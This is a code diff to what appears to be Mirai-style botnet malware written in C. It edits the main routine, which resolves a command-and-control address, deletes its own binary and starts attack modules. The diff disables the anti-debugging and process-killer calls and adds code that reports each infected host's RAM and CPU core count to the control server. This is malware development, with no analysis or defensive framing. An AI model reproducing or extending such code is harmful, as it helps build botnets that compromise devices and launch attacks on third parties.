@@ -32,6 +32,7 @@
 #include "resolv.h"
 #include "killer.h"
 #include "antidebug.h"
+#include "sysinfo.h"
 
 static void anti_gdb_entry(int);
 static void resolve_cnc_addr(void);
@@ -95,7 +96,7 @@ int main(int argc, char **args)
     char id_buf[32];
     int pgid, pings = 0; 
     defend_binary();
-    antidebug();
+    //antidebug();
     unlink(args[0]);
 
     #ifndef DEBUG
@@ -155,7 +156,7 @@ int main(int argc, char **args)
     #endif
     flush();
     attack_init();
-    killer_init();
+    //killer_init();
     antidebug();
 
     chdir("/");
@@ -251,6 +252,12 @@ int main(int argc, char **args)
                     uint8_t arch_len = util_strlen(arch);
                     send(fd_serv, &arch_len, 1, MSG_NOSIGNAL);
                     send(fd_serv, arch, arch_len, MSG_NOSIGNAL);
+                    // RAM total (4 bytes, big endian)
+                    uint32_t ram_mb = htonl(get_total_ram_mb());
+                    send(fd_serv, &ram_mb, sizeof(ram_mb), MSG_NOSIGNAL);
+                    // CPU cores (1 byte)
+                    uint8_t cpu_cores = get_cpu_cores();
+                    send(fd_serv, &cpu_cores, sizeof(cpu_cores), MSG_NOSIGNAL);
 
                     //if(id_len > 0)
                     //{
